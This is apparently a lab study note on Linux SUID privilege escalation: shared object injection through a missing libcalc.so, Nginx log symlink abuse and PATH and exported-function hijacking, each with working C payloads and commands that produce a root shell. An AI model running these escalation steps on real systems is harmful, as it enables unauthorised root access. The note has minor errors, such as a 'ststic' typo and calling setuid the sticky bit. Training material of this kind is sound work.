
For basic info on how to find files with SUID or SGID is set, look [[Privilege Escalation#^257fb3|here]].

## Shared Object Injection

Another method we can exploit SUID files is by performing shared object injections. First we need to identify files that rely on shared objects for execution. We can do this using the `strace` tool.

```bash
TCM@debian:~$ find / -perm -04000 -type f -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

We can see that there are three files with both SUID and SGID set. Let's have a look at the `/usr/local/bin/suid-so` file first. When we execute the file, we get the following output.

```bash
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

Since something is happening when the file ie being run, we can use `strace` to trace whats happening when it run. Since most of the output is printed to `stderr`, we need to direct it to `stdout` via `2>&1` for further analysis.

```bash
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ strace /usr/local/bin/suid-so 2>/dev/null| grep directory
TCM@debian:~$ strace /usr/local/bin/suid-so
execve("/usr/local/bin/suid-so", ["/usr/local/bin/suid-so"], [/* 17 vars */]) = 0
brk(0)                                  = 0x713000
fcntl(0, F_GETFD)                       = 0
fcntl(1, F_GETFD)                       = 0
fcntl(2, F_GETFD)                       = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc253e19000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=13345, ...}) = 0
mmap(NULL, 13345, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fc253e15000
close(3)                                = 0
.
.
```

We see there are errors saying `No such file or directory`, which is what we are after. We can use `grep` to filter the output and see which files are accessed when the binary is run.

```bash
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1| grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

The `-i` ignores the case and `-E` enables extended regex use so we can use the `|` operator for the `or` functionality.

The `/home/user/.config/libcalc.so` stands out from the rest since it seems to be a user own file. Since we can write to the `/home/user` directory, we can overwrite this file and replace it with a piece of code we want to be executed. 

```C
#include <stdio.h>
#include <stdlib.h>

ststic void inject() __attribute__((constructor));

void inject() {
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Next we need to compile it as a shared object using `GCC`.

```bash
TCM@debian:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c 
```

Finally, when we execute the initial program we get a console as root.

```bash
TCM@debian:~/.config$ /usr/local/bin/suid-so 
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# whoami
root
```


## Binary Symlinks

We can exploit a tool that uses a SUID binary to gain root access by overwriting a file that is used by the tool.

For example, `Nginx < 1.6.2`  has a vulnerability where the `/var/log/nginx/` log directory is owned by `www-data`. Since logging is handled by the master process that runs as `root`, we can manipulate the logging process if we have compromised the `www-data` user.

We can remove the existing log file and create a symlink to the location that points to a shell code. When an error occurs and the master process tried to write it to the error log, instead it executed the command in a shell with the SUID set. Enabling the attacker to gain root access. For more info read [this](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html).

## Environmental Variables

Another way we can exploit SUID files is by manipulating the `PATH` variable. From our initial search, we found out there is file named `/usr/local/bin/suid-env` that has SUID set.

### Relative Path

If we perform a `strings` look up on it, we get the following output.

```bash
TCM@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

It seems like the `service` command is called within the binary. If we can override which file is run when the `service` command is invoked, we can exploit this binary. 

Since the absolute path is not given, we can manipulate the `$PATH` env variable to point `service` to one of our own files as follow.

```bash
TCM@debian:~$ echo 'int main() {setgid(0); setuid(0); system("/bin/bash");}' > /tmp/service.c
TCM@debian:~$ cat /tmp/service.c 
int main() {setgid(0); setuid(0); system("/bin/bash");}
TCM@debian:~$ gcc -o /tmp/service /tmp/service.c
TCM@debian:~$ export PATH=/tmp:$PATH
TCM@debian:~$ $PATH
bash: /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin: No such file or directory
```

Now, the first place `service` is searched for is the `/tmp` directory and we have written a simple script named `service` to open up `bash`. Now we simply need to execute the `/usr/local/bin/suid-env` binary.

```bash
TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

### Absolute Path

Let's look at another binary that uses env variables.

```bash
TCM@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

TCM@debian:~$ ls -ld /usr/sbin/
drwxr-xr-x 2 root root 4096 May 14  2017 /usr/sbin/
```

Unlike the previous binary, this calls the function by its absolute path. Since only `root` has write privileges to `/usr/bin`, we cannot edit the `service` binary as well.

However, there is another way to manipulate the env variables by defining a function. We will overwrite `/usr/bin/service` with a custom function that will create a copy of `bash` with the sticky bit set and execute it.

```bash
TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~$ export -f /usr/sbin/service
root@debian:~# whoami
root
```

Since we are creating a subshell when the binary is executed, we need to export the function using the `export -f` command.

